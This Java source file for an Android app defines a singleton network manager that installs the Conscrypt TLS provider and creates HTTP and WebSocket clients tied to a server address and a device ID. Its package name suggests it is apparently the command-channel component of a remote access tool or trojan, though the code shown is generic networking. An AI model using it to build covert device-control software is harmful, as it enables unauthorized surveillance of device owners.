package com.vendor.rat.network;

import android.util.Log;

import org.conscrypt.Conscrypt;

import java.security.Security;

import okhttp3.OkHttpClient;

/**
 * 网络管理器（单例）
 *
 * 管理 HTTP 客户端和 WebSocket 客户端
 * 提供统一的网络访问入口
 */
public class NetworkManager {

    private static final String TAG = "NetworkManager";
    private static volatile NetworkManager instance;

    private HttpClient httpClient;
    private WebSocketClient wsClient;
    private String deviceId;

    private NetworkManager() {}

    public static NetworkManager getInstance() {
        if (instance == null) {
            synchronized (NetworkManager.class) {
                if (instance == null) {
                    instance = new NetworkManager();
                }
            }
        }
        return instance;
    }

    /**
     * 初始化网络组件
     *
     * @param serverHost   HTTP 服务地址
     * @param wsUrl        WebSocket 地址
     * @param deviceId     设备唯一标识
     */
    public void init(String serverHost, String wsUrl, String deviceId) {
        this.deviceId = deviceId;

        // 安装 Conscrypt TLS 1.3 提供者
        try {
            Security.insertProviderAt(Conscrypt.newProvider(), 1);
            Log.d(TAG, "Conscrypt TLS provider installed");
        } catch (Exception e) {
            Log.w(TAG, "Conscrypt install failed, using default", e);
        }

        // 初始化 HTTP 客户端
        httpClient = new HttpClient(serverHost, deviceId);

        // 初始化 WebSocket 客户端
        wsClient = new WebSocketClient(wsUrl, deviceId);

        Log.i(TAG, "Network initialized: server=" + serverHost);
    }

    public HttpClient getHttpClient() { return httpClient; }
    public WebSocketClient getWebSocketClient() { return wsClient; }
    public String getDeviceId() { return deviceId; }
}
